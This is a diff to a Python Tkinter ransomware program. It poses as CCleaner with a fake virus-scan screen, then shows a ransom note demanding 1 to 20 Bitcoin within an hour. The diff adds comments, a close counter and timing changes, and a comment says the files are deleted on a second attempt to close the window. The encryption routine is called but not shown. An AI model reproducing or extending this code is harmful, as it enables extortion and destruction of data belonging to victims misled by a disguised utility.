@@ -18,14 +18,16 @@ def gui_decrypt_files(file_paths, fernet, key):
         global global_status
         global_status = 'Decrypted'
         
+        #Decrypt all files in the file path using the fernet object
         encrypter.decrypt_files(file_paths, fernet)
 
         #Message Box announcing to user that their files have been decrypted. Once the box is closed, the program terminates.
         messagebox.showinfo(title = 'Files Decrypted', message = 'Your files have been decrypted. Thank you for your cooperation. Have a nice day')
 
+        #Terminates program
         root.destroy()
 
-#Function to display message and prevent program from closing when user tries to exit out
+#Function to display message and prevent program from closing when user tries to exit out; gives warning on first close attempt, deletes all files in file_paths on second close attempt
 def on_close():
     global close_counter
     if close_counter == 0:
@@ -47,12 +49,13 @@ root.geometry("1280x720")
 root.configure(bg = 'white')
 root.protocol('WM_DELETE_WINDOW',on_close)
 
-#Global variable to create the number of bitcoins we want user to send
+#Global variables
 how_many_bitcoins_do_we_want = str(random.randint(1,20))
 global_status = 'Running'
 files_generated = False
+close_counter = 0
 
-#First Tab Widgets ----------------------------------------------------------------------------------------------------------
+#First Tab Widgets -----------------------------------------------------------------------------------------------------------------------------
 ccleaner_name = Label(root, text="CCleaner", font = ('Trebuchet MS', 100), fg = 'grey', bg = 'white')
 ccleaner_name.place(x = 500, y = 200)
 
@@ -67,7 +70,7 @@ progress_bar.start(15)
 
 scanning_text = Label(root, text="Scanning files for viruses...", font = ('Trebuchet MS', 18), fg = 'grey', bg = 'white')
 scanning_text.place(x = 505, y = 545)
-# ---------------------------------------------------------------------------------------------------------------------------
+# ----------------------------------------------------------------------------------------------------------------------------------------------
 
 #Initializes 2nd tab widgets
 main_text = Label(root, text="Your important financial files have just been encrypted.\nSend " +how_many_bitcoins_do_we_want + " BitCoin to us, or your files will be deleted and lost forever.\nYou have one hour.", font = ('Times New Roman', 24), fg = 'white', bg = 'red')
@@ -99,9 +102,6 @@ def tab2():
     curr_time = str(datetime.now())
     end_time = str((int(curr_time[11:13]) + 1) % 24) + curr_time[13:19]
     end_time_min = curr_time[11:14] + str((int(curr_time[14:16]) + 1) % 60) + curr_time[16:19]
-
-    #Message Box to prevent user from panic closing the program on running, so they don't keep files encrypted forever.
-    messagebox.showinfo(title = 'READ', message = "IMPORTANT. DO NOT CLOSE PROGRAM WITHOUT READING OR YOU WILL LOSE IMPORTANT FILES.")
 
     # Countdown Timer Stuff ---------------------------------------------------------------
     def update_time():
@@ -158,8 +158,11 @@ def tab2():
     image_label3.place(x = 0, y = 500)
     image_label4.place(x = 1051, y = 500)
 
+    #Message Box to prevent user from panic closing the program on running, so they don't keep files encrypted forever.
+    messagebox.showinfo(title = 'READ', message = "IMPORTANT. DO NOT CLOSE PROGRAM WITHOUT READING OR YOU WILL LOSE IMPORTANT FILES.")
 # ====================================================================================================================================================================================
 
+#Runs the intro screen for 5 extra seconds after file_paths has been generated to keep the first disguise screen on for a little longer and in cases where there are not many files to scan through.
 if files_generated == True:
     root.after(5000,tab2)
 
